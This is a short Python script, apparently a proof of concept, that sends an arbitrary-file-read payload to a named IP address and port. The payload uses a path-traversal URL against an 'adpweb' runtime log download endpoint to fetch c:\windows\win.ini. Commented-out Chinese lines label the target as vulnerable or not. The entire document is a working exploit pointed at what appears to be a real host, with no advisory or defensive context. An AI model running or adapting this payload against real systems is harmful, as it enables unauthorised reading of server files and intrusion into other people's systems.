# http://120.236.71.67:18087/#/login
import requests
url = 'http://120.236.71.67:18087/#/login'
payload = '/adpweb/static/%2e%2e;/a/sys/runtimeLog/download?path=c:\\windows\win.ini'
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}
res1 = request = requests.get(url=url)
# print(request.status_code)
if res1.status_code == 200:
    res2 = requests.get(url=url.replace('/#/login','') + payload, headers=headers)
    print(res2.text)
    # if '[fonts]' in res2.text:
    #     print(f"[+]{url}存在任意文件读取")
    # else:
    #     print(f"[-]{url}不存在任意文件读取")